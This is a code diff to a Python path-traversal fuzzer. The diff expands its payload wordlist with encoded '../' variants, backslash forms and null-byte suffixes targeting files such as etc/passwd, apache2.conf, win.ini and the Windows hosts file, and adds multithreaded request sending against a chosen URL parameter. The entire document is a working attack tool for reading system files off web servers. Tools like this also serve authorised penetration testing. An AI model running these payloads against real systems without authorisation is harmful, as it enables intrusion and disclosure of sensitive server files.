@@ -1,29 +1,32 @@
 import argparse
 import requests
 from urllib.parse import urlencode
+from concurrent.futures import ThreadPoolExecutor, as_completed
 
 def get_args():
     parser = argparse.ArgumentParser()
     args_group = parser.add_argument_group("Generic", "Generic options")
-    args_group.add_argument("--target", type=str, help="", required=True)
-    args_group.add_argument("--path", type=str, help="", required=True)
-    args_group.add_argument("--param", type=str, help="", required=True)
-    args_group.add_argument("--depth", type=int, default=4, help="")
-    args_group.add_argument("--fs", type=lambda s: list(map(int, s.split(','))), help="")
+    args_group.add_argument("--target", type=str, help="Specify the target's URL or IP address.", required=True)
+    args_group.add_argument("--path", type=str, help="Specify the path within the target website.", required=True)
+    args_group.add_argument("--param", type=str, help="Specify the name of the parameter to test.", required=True)
+    args_group.add_argument("--depth", type=int, default=4, help="Set the maximum depth level to test.")
+    args_group.add_argument("--fs", type=lambda s: list(map(int, s.split(','))), help="Filter responses by size. Provide one or more sizes separated by commas (e.g., 50,85).")
+    args_group.add_argument("--threads", type=int, default=20, help="Specify the number of threads to use for concurrent requests.")
+    args_group.add_argument("--timeout", type=int, default=5, help="Set the timeout duration (in seconds) for each request.")
 
     return parser.parse_args()
 
 
 def generate_wordlist(depth):
     result = []
-    single_options = ["/"]
-    path_traversal_options = ["../", "....//", r"....\/", r"%2e%2e%2f", r"%252e%252e%252f", r"..%c0%af", r"..%ef%bc%8f"]
-    targets_files = ["etc/passwd", "etc/apache2/apache2.conf"]
+    single_options = ["/", "\\"]
+    path_traversal_options = ["../", "....//", r"....\/", r"%2e%2e%2f", r"%252e%252e%252f", r"..%c0%af", r"..%ef%bc%8f", "\\.."]
+    targets_files = ["etc/passwd", "etc/apache2/apache2.conf", "\\windows\\win.ini", "windows/win.ini", "\\windows\\system32\\drivers\\etc\\hosts", "windows/system32/drivers/etc/hosts"]
     common_directories_filter = ["/var/www/images/"]
-    web_extensions = ["png"]
+    web_extensions = ["png", "jpg", "php", "html", "js", "aspx", "asp"]
     special_suffix = [r"%00"]
 
-    null_byte_suffixes = [s + '.' + ext for s in special_suffix for ext in web_extensions]
+    special_suffixes = [s + '.' + ext for s in special_suffix for ext in web_extensions]
 
     for d in range(1, depth + 1):
         for target in targets_files:
@@ -32,7 +35,7 @@ def generate_wordlist(depth):
                     payloads = [s + target]
 
                     for p in payloads[:]:
-                        for suffix in null_byte_suffixes:
+                        for suffix in special_suffixes:
                             payloads.append(p + suffix)
 
                     for payload in payloads:
@@ -45,7 +48,7 @@ def generate_wordlist(depth):
                 payloads = [traversal + target]
 
                 for p in payloads[:]:
-                    for suffix in null_byte_suffixes:
+                    for suffix in special_suffixes:
                         payloads.append(p + suffix)
 
                 for payload in payloads:
@@ -62,27 +65,38 @@ def run_attack(args, wordlist):
 
     base_url = args.target.rstrip('/') + '/' + args.path.lstrip('/')
 
-    for payload in wordlist:
+    def process_payload(payload):
         params = {args.param: payload}
         query_string = urlencode(params, quote_via=lambda x, safe='', encoding=None, errors=None: x)
         full_url = f"{base_url}?{query_string}"
-        
+
         try:
-            response = requests.get(full_url, timeout=5)
+            response = requests.get(full_url, timeout=args.timeout)
             if args.fs is None or len(response.text) not in args.fs:
-                results.append({
+                return {
                     'url': response.url,
                     'status_code': response.status_code,
                     'payload': payload,
                     'content_length': len(response.text)
-                })
-                print(f"[+] Found: [Size: {len(response.text)}, Payload: {payload}, URL: {response.url}]")
+                }
         except requests.RequestException as e:
-            results.append({
+            return {
                 'url': base_url,
                 'payload': payload,
                 'error': str(e)
-            })
+            }
+
+    with ThreadPoolExecutor(max_workers=args.threads) as executor:
+        futures = {executor.submit(process_payload, payload): payload for payload in wordlist}
+
+        for future in as_completed(futures):
+            result = future.result()
+            if result:
+                results.append(result)
+                if 'error' not in result:
+                    print(f"[+] Found: [Size: {result['content_length']}, Payload: {result['payload']}, URL: {result['url']}]")
+                else:
+                    print(f"[!] Error: [Payload: {result['payload']}, Error: {result['error']}]")
 
     print("\r[+] Execution completed.   ")
 
@@ -91,7 +105,6 @@ def run_attack(args, wordlist):
 
 def main():
     args = get_args()
-    print(args)
 
     wordlist = generate_wordlist(args.depth)
 
